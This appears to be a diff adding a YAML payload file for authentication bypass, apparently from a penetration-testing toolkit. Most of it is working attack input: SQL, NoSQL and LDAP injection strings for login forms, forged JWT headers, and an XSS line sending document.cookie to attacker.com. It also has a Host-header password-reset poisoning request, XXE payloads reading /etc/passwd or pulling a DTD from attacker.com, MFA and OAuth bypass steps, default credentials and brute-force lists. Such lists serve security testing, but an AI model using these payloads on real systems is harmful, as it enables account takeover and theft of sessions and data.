@@ -1,0 +1,254 @@
+# Payloads - Authentication Bypass
+# Authentication and Session Management Attack Payloads
+
+payload_category: "authentication"
+version: "1.0"
+description: "Payloads for bypassing authentication, session hijacking, and credential attacks"
+
+# SQL Injection for Authentication Bypass
+sql_injection_auth:
+  basic_bypass:
+    - "admin' --"
+    - "admin' #"
+    - "admin'/*"
+    - "' OR '1'='1"
+    - "' OR '1'='1' --"
+    - "' OR '1'='1' #"
+    - "' OR '1'='1'/*"
+    - "admin' OR '1'='1"
+    - "admin' OR '1'='1' --"
+    - "admin' OR '1'='1' #"
+  
+  username_field:
+    - "admin' OR 1=1--"
+    - "administrator' OR '1'='1'--"
+    - "' OR 'x'='x"
+    - "') OR ('1'='1"
+    - "') OR ('1'='1' --"
+    - "' OR 1=1#"
+    - "1' OR '1' = '1"
+    - "admin' OR 'a'='a"
+  
+  password_field:
+    - "' OR '1'='1"
+    - "password' OR 1=1--"
+    - "' OR 'x'='x"
+    - "anything' OR 'x'='x"
+  
+  combined_injection:
+    username: "admin' --"
+    password: "anything (commented out)"
+    note: "Password check bypassed by SQL comment"
+
+# NoSQL Injection for Authentication
+# See: payloads/injection/nosql-injection.yaml for comprehensive NoSQL payloads
+nosql_injection_basic:
+  reference: "See payloads/injection/nosql-injection.yaml"
+  quick_test:
+    - '{"username": {"$ne": null}, "password": {"$ne": null}}'
+    - "username[$ne]=&password[$ne]="
+
+# JWT Token Manipulation
+# See: api/api-security-testing.yaml for comprehensive JWT attacks
+jwt_attacks:
+  reference: "See api/api-security-testing.yaml for comprehensive JWT attacks"
+  quick_tests:
+    none_algorithm: '{"alg":"none","typ":"JWT"}.{"sub":"admin"}.'
+    weak_secret_check: "hashcat -m 16500 jwt.txt wordlist.txt"
+    claim_manipulation: "Modify role/admin claims in payload"
+    kid_injection:
+      - '{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}'
+      - '{"alg":"HS256","typ":"JWT","kid":"/dev/null"}'
+    note: "Empty key from /dev/null signs with empty string"
+
+# Session Token Attacks
+session_tokens:
+  predictable_tokens:
+    - "Sequential: SESSION123, SESSION124, SESSION125"
+    - "Timestamp-based: 1609459200 (Unix timestamp)"
+    - "MD5 of username: 5f4dcc3b5aa765d61d8327deb882cf99"
+  
+  session_fixation:
+    - "Append session ID: ?sessionid=attacker_controlled_value"
+    - "Cookie injection: Cookie: PHPSESSID=attacker_session"
+    - "URL rewrite: /login;jsessionid=attacker_session"
+  
+  session_hijacking:
+    xss_steal: "fetch('https://attacker.com/?cookie=' + document.cookie)"
+    mitm: "Capture session cookie over HTTP (no Secure flag)"
+
+# Password Reset Token Attacks
+password_reset:
+  host_header_injection:
+    request: |
+      POST /forgot-password HTTP/1.1
+      Host: attacker.com
+      ...
+      email=victim@example.com
+    result: "Reset link: https://attacker.com/reset?token=ABC123"
+  
+  weak_tokens:
+    - "Timestamp-based: 1609459200"
+    - "Sequential: RESET001, RESET002"
+    - "MD5 of email: 5d41402abc4b2a76b9719d911017c592"
+  
+  token_reuse:
+    - "Request token"
+    - "Reset password"
+    - "Reuse same token (if not invalidated)"
+
+# Multi-Factor Authentication Bypass
+mfa_bypass:
+  direct_navigation:
+    - "Login with valid credentials"
+    - "Skip MFA by navigating to /dashboard directly"
+    - "Check if authorization exists without MFA verification"
+  
+  response_manipulation:
+    original: '{"success":false,"mfa_verified":false}'
+    modified: '{"success":true,"mfa_verified":true}'
+    tool: "Burp Proxy to intercept and modify"
+  
+  brute_force_otp:
+    - "000000 to 999999 (6-digit codes)"
+    - "0000 to 9999 (4-digit codes)"
+    - "If no rate limiting: Can brute force in minutes"
+  
+  backup_code_reuse:
+    - "Use backup code once"
+    - "Try reusing same code (if not invalidated)"
+
+# OAuth/OIDC Bypass
+oauth_attacks:
+  redirect_uri_manipulation:
+    - "redirect_uri=https://attacker.com"
+    - "redirect_uri=https://victim.com@attacker.com"
+    - "redirect_uri=https://victim.com.attacker.com"
+  
+  state_parameter:
+    - "Remove state parameter (CSRF protection)"
+    - "Replay state value"
+  
+  code_interception:
+    - "Authorization code in URL: ?code=ABC123"
+    - "Steal code via Referer header leak"
+
+# LDAP Injection for Authentication
+ldap_injection:
+  bypass_payloads:
+    - "*"
+    - "*)(uid=*))(|(uid=*"
+    - "admin)(&)"
+    - "admin)(|(password=*"
+  
+  username_field:
+    - "*)(objectClass=*))(&(objectClass=*"
+    - "admin*"
+    - "*)(&"
+  
+  description: "Modify LDAP filter to bypass authentication"
+  example_filter: "(&(uid=$username)(userPassword=$password))"
+  injected: "(&(uid=*)(userPassword=*))  → Always true"
+
+# XML External Entity (XXE) for Authentication
+xxe_auth:
+  payload: |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <login>
+      <username>&xxe;</username>
+      <password>anything</password>
+    </login>
+  
+  blind_xxe: |
+    <!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+    %xxe;
+    ]>
+
+# Default Credentials
+default_credentials:
+  common_combinations:
+    - username: "admin"
+      password: "admin"
+    - username: "admin"
+      password: "password"
+    - username: "administrator"
+      password: "administrator"
+    - username: "root"
+      password: "root"
+    - username: "admin"
+      password: "admin123"
+    - username: "user"
+      password: "user"
+    - username: "test"
+      password: "test"
+  
+  database:
+    mysql: { username: "root", password: "" }
+    postgresql: { username: "postgres", password: "postgres" }
+    mongodb: { username: "admin", password: "admin" }
+  
+  applications:
+    tomcat: { username: "tomcat", password: "tomcat" }
+    jenkins: { username: "admin", password: "password" }
+    grafana: { username: "admin", password: "admin" }
+
+# Race Condition Exploits
+race_condition:
+  password_reset:
+    - "Request multiple password reset tokens simultaneously"
+    - "Use older token if newer one invalidates it"
+  
+  otp_verification:
+    - "Submit same OTP code in parallel requests"
+    - "May bypass one-time use check"
+
+# Brute Force Payloads
+brute_force:
+  common_passwords:
+    - "password"
+    - "123456"
+    - "password123"
+    - "admin"
+    - "12345678"
+    - "qwerty"
+    - "abc123"
+    - "Password1"
+    - "admin123"
+    - "letmein"
+  
+  pattern_based:
+    - "Season + Year: Summer2024, Winter2023"
+    - "Company + Year: CompanyName2024"
+    - "Month + Year: January2024"
+
+# Response Manipulation
+response_manipulation:
+  status_code:
+    original: "HTTP/1.1 401 Unauthorized"
+    modified: "HTTP/1.1 200 OK"
+  
+  json_response:
+    original: '{"authenticated":false,"role":"guest"}'
+    modified: '{"authenticated":true,"role":"admin"}'
+  
+  html_response:
+    original: '<div class="error">Invalid credentials</div>'
+    modified: '<div class="success">Login successful</div>'
+
+tools:
+  - "Burp Suite: Session manipulation, response modification"
+  - "JWT_Tool: JWT token testing and exploitation"
+  - "SQLMap: Automated SQL injection for auth bypass"
+  - "NoSQLMap: NoSQL injection testing"
+  - "Hydra: Brute force authentication"
+  - "Postman: API authentication testing"
+
+references:
+  - "OWASP Top 10:2025 A07 (Authentication Failures)"
+  - "PortSwigger: Authentication vulnerabilities"
+  - "JWT.io: JWT token decoder and debugger"
+  - "CWE-287: Improper Authentication"
